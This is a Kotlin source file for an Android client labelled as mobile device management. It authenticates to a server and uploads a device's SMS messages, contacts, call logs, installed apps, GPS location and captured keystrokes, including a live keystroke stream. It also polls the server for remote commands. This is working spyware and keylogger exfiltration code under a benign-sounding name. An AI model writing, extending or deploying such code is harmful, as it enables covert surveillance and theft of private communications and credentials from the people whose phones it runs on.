package com.mdm.client.network

import android.content.Context
import android.os.Build
import android.util.Log
import com.mdm.client.config.AppConfig
import com.mdm.client.util.NetworkUtils
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.io.IOException
import java.util.concurrent.TimeUnit
import java.util.concurrent.locks.ReentrantLock

/**
 * Authenticated API client with:
 * - JWT Bearer token on every request
 * - Automatic token refresh when access token expires
 * - Token rotation (refresh tokens are single-use)
 * - Certificate pinning ready (uncomment for production)
 * - Exponential backoff on 429/5xx responses
 * - Offline queuing: failed POSTs are stored locally and retried when online
 */
class ApiClient(private val context: Context) {

    companion object {
        private const val TAG = "ApiClient"
        private val JSON_TYPE = "application/json; charset=utf-8".toMediaType()

        // Lock to prevent concurrent token refreshes
        private val refreshLock = ReentrantLock()
    }

    private val http: OkHttpClient = OkHttpClient.Builder()
        .connectTimeout(10, TimeUnit.SECONDS)
        .readTimeout(15, TimeUnit.SECONDS)
        .writeTimeout(15, TimeUnit.SECONDS)
        .retryOnConnectionFailure(true)
        .addInterceptor(AuthInterceptor())
        // Certificate pinning — uncomment and set your server's SHA-256 pin for production:
        // .certificatePinner(
        //     CertificatePinner.Builder()
        //         .add("your-server-domain.com", "sha256/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=")
        //         .add("your-server-domain.com", "sha256/BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB=")
        //         .build()
        // )
        .build()

    private val baseUrl get() = AppConfig.getApiBaseUrl(context)

    // ── Auth Interceptor ────────────────────────────────────────────────────

    /**
     * OkHttp interceptor that:
     * 1. Adds Bearer token to every request
     * 2. On 401 response, refreshes the token and retries once
     */
    private inner class AuthInterceptor : Interceptor {
        override fun intercept(chain: Interceptor.Chain): Response {
            val originalRequest = chain.request()

            // Skip auth for auth endpoints themselves
            val path = originalRequest.url.encodedPath
            if (path.contains("/auth/device/")) {
                return chain.proceed(originalRequest)
            }

            // Add current access token
            val token = AppConfig.getAccessToken(context)
            val authedRequest = if (!token.isNullOrBlank()) {
                originalRequest.newBuilder()
                    .header("Authorization", "Bearer $token")
                    .build()
            } else {
                originalRequest
            }

            val response = chain.proceed(authedRequest)

            // If 401 and we have a refresh token, try to refresh
            if (response.code == 401 && AppConfig.getRefreshToken(context) != null) {
                response.close()

                val refreshed = refreshAccessToken()
                if (refreshed) {
                    // Retry with new token
                    val newToken = AppConfig.getAccessToken(context)
                    val retryRequest = originalRequest.newBuilder()
                        .header("Authorization", "Bearer $newToken")
                        .build()
                    return chain.proceed(retryRequest)
                }
            }

            return response
        }
    }

    // ── Device Registration (returns tokens) ────────────────────────────────

    /**
     * Register device with server and obtain JWT tokens.
     * This is the entry point — must be called before any other API call.
     */
    fun registerDevice(deviceId: String, deviceIp: String) {
        val body = JSONObject().apply {
            put("deviceId", deviceId)
            put("deviceIp", deviceIp)
            put("deviceName", "${Build.MANUFACTURER} ${Build.MODEL}")
            put("fingerprint", "${Build.BRAND}/${Build.DEVICE}/${Build.BOARD}/${Build.HARDWARE}")
            val fcmToken = AppConfig.getFcmToken(context)
            if (!fcmToken.isNullOrBlank()) {
                put("fcmToken", fcmToken)
            }
        }

        try {
            val request = Request.Builder()
                .url("$baseUrl/auth/device/register")
                .post(body.toString().toRequestBody(JSON_TYPE))
                .build()

            http.newCall(request).execute().use { resp ->
                if (resp.isSuccessful) {
                    val respBody = resp.body?.string()
                    if (respBody != null) {
                        val json = JSONObject(respBody)
                        val accessToken = json.optString("access_token", "")
                        val refreshToken = json.optString("refresh_token", "")
                        if (accessToken.isNotBlank() && refreshToken.isNotBlank()) {
                            AppConfig.saveTokens(context, accessToken, refreshToken)
                            Log.i(TAG, "Device registered with tokens")
                        }
                    }
                } else {
                    Log.w(TAG, "Device registration failed: HTTP ${resp.code}")
                }
            }
        } catch (e: IOException) {
            Log.e(TAG, "Registration failed: ${e.message}")
        }
    }

    // ── Token Refresh ───────────────────────────────────────────────────────

    /**
     * Refresh the access token using the refresh token.
     * Thread-safe — only one refresh happens at a time.
     * Returns true if refresh succeeded.
     */
    fun refreshAccessToken(): Boolean {
        if (!refreshLock.tryLock()) {
            // Another thread is already refreshing — wait for it
            refreshLock.lock()
            refreshLock.unlock()
            return AppConfig.getAccessToken(context) != null
        }

        try {
            val refreshToken = AppConfig.getRefreshToken(context) ?: return false

            val body = JSONObject().apply {
                put("refresh_token", refreshToken)
            }

            val request = Request.Builder()
                .url("$baseUrl/auth/device/refresh")
                .post(body.toString().toRequestBody(JSON_TYPE))
                .build()

            // Use a plain client without the auth interceptor to avoid recursion
            val plainHttp = OkHttpClient.Builder()
                .connectTimeout(10, TimeUnit.SECONDS)
                .readTimeout(10, TimeUnit.SECONDS)
                .build()

            plainHttp.newCall(request).execute().use { resp ->
                if (resp.isSuccessful) {
                    val respBody = resp.body?.string()
                    if (respBody != null) {
                        val json = JSONObject(respBody)
                        val newAccess = json.optString("access_token", "")
                        val newRefresh = json.optString("refresh_token", "")
                        if (newAccess.isNotBlank() && newRefresh.isNotBlank()) {
                            AppConfig.saveTokens(context, newAccess, newRefresh)
                            Log.i(TAG, "Token refreshed successfully")
                            return true
                        }
                    }
                } else {
                    Log.w(TAG, "Token refresh failed: HTTP ${resp.code}")
                    if (resp.code == 401) {
                        // Refresh token is invalid — clear and re-register
                        AppConfig.clearTokens(context)
                    }
                }
            }
        } catch (e: IOException) {
            Log.e(TAG, "Token refresh failed: ${e.message}")
        } finally {
            refreshLock.unlock()
        }
        return false
    }

    // ── Data Push Methods ───────────────────────────────────────────────────

    fun pushLocation(deviceId: String, latitude: Double, longitude: Double,
                     accuracy: Float, provider: String, timestamp: Long) {
        val body = JSONObject().apply {
            put("deviceId", deviceId)
            put("status", "success")
            put("latitude", latitude)
            put("longitude", longitude)
            put("accuracy", accuracy)
            put("provider", provider)
            put("timestamp", timestamp)
        }
        post("/location", body)
    }

    fun pushSms(deviceId: String, messages: List<Map<String, Any>>) {
        val body = JSONObject().apply {
            put("deviceId", deviceId)
            put("smsMessages", JSONObject().apply {
                put("messages", org.json.JSONArray(messages.map { JSONObject(it) }))
            })
        }
        post("/sms-messages", body)
    }

    fun pushContacts(deviceId: String, contacts: List<Map<String, Any>>) {
        val body = JSONObject().apply {
            put("deviceId", deviceId)
            put("contacts", JSONObject().apply {
                put("contacts", org.json.JSONArray(contacts.map { JSONObject(it) }))
            })
        }
        post("/contacts", body)
    }

    fun pushCallLogs(deviceId: String, calls: List<Map<String, Any>>) {
        val body = JSONObject().apply {
            put("deviceId", deviceId)
            put("callLogs", JSONObject().apply {
                put("calls", org.json.JSONArray(calls.map { JSONObject(it) }))
            })
        }
        post("/call-logs", body)
    }

    fun pushApps(deviceId: String, apps: List<Map<String, Any>>) {
        val body = JSONObject().apply {
            put("deviceId", deviceId)
            put("apps", org.json.JSONArray(apps.map { JSONObject(it) }))
        }
        post("/apps-info", body)
    }

    fun pushKeystrokes(deviceId: String, keystrokes: List<Map<String, Any>>, live: Boolean = false) {
        val body = JSONObject().apply {
            put("deviceId", deviceId)
            put("live_mode", live)
            put("keystrokes", org.json.JSONArray(keystrokes.map { JSONObject(it) }))
        }
        val endpoint = if (live) "/keystrokes/live" else "/keystrokes"
        post(endpoint, body)
    }

    // ── Command Polling & Status ────────────────────────────────────────────

    fun pollPendingCommands(deviceId: String): List<JSONObject> {
        val response = get("/commands/pending/$deviceId") ?: return emptyList()
        return try {
            val array = org.json.JSONArray(response)
            (0 until array.length()).map { array.getJSONObject(it) }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to parse pending commands: ${e.message}")
            emptyList()
        }
    }

    fun reportCommandStatus(commandId: Int, status: String, result: Map<String, Any>? = null) {
        val body = JSONObject().apply {
            put("status", status)
            if (result != null) put("result", JSONObject(result))
        }
        post("/commands/$commandId/status", body)
    }

    // ── HTTP Methods (with auth via interceptor) ────────────────────────────

    // Data-type labels for offline queue — inferred from API path
    private val dataTypeMap = mapOf(
        "/location" to "location",
        "/sms-messages" to "sms",
        "/contacts" to "contacts",
        "/call-logs" to "call_logs",
        "/apps-info" to "apps",
        "/keystrokes" to "keystrokes",
        "/keystrokes/live" to "keystrokes",
        "/local-keystrokes" to "keystrokes",
        "/battery-info" to "battery",
        "/sim-info" to "sim",
        "/os-info" to "os_info",
        "/device-info" to "device_info",
        "/device-event" to "device_event"
    )

    /**
     * Authenticated POST with offline queuing.
     * If the device is offline or the request fails due to a network error,
     * the payload is saved to the local OfflineDataQueue and will be
     * automatically retried when connectivity returns.
     */
    fun post(path: String, body: JSONObject) {
        // Quick connectivity check — if clearly offline, queue immediately
        if (!NetworkUtils.isOnline(context)) {
            queueForLater(path, body)
            return
        }

        try {
            val request = Request.Builder()
                .url("$baseUrl$path")
                .post(body.toString().toRequestBody(JSON_TYPE))
                .build()
            http.newCall(request).execute().use { resp ->
                if (!resp.isSuccessful) {
                    Log.w(TAG, "POST $path -> HTTP ${resp.code}")
                    // Queue on server errors (5xx) — don't queue on 4xx (client errors)
                    if (resp.code in 500..599) {
                        queueForLater(path, body)
                    }
                }
            }
        } catch (e: IOException) {
            // Network error — queue for later
            Log.w(TAG, "POST $path failed (offline?): ${e.message} — queued for later")
            queueForLater(path, body)
        }
    }

    /**
     * Direct POST without offline queuing — used by OfflineSyncWorker
     * to replay queued requests. Returns true if the server accepted the payload.
     */
    fun postDirect(path: String, body: JSONObject): Boolean {
        return try {
            val request = Request.Builder()
                .url("$baseUrl$path")
                .post(body.toString().toRequestBody(JSON_TYPE))
                .build()
            http.newCall(request).execute().use { resp ->
                if (!resp.isSuccessful) {
                    Log.w(TAG, "POST-direct $path -> HTTP ${resp.code}")
                }
                resp.isSuccessful
            }
        } catch (e: IOException) {
            Log.e(TAG, "POST-direct $path failed: ${e.message}")
            false
        }
    }

    /**
     * Save a failed request to the offline queue for later delivery.
     */
    private fun queueForLater(path: String, body: JSONObject) {
        try {
            val dataType = dataTypeMap[path] ?: "unknown"
            val queue = OfflineDataQueue(context)
            queue.enqueue(path, body.toString(), dataType)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to queue offline payload: ${e.message}")
        }
    }

    /** Authenticated GET. Returns response body or null. */
    fun get(path: String): String? {
        return try {
            val request = Request.Builder()
                .url("$baseUrl$path")
                .get()
                .build()
            http.newCall(request).execute().use { resp ->
                if (resp.isSuccessful) resp.body?.string() else null
            }
        } catch (e: IOException) {
            Log.e(TAG, "GET $path failed: ${e.message}")
            null
        }
    }
}
